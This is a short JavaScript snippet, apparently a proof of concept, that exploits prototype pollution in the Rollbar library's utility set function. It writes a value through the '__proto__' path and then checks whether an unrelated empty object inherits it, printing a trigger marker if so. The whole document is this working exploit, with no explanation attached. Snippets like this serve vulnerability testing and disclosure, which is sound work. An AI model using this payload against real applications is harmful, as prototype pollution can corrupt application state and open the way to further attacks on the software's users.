const obj = {};
require("rollbar/src/utility").set(obj, "__proto__.polluted", "vulnerable");
console.log({}.polluted !== undefined ? '[POLLUTION_TRIGGERED]':'');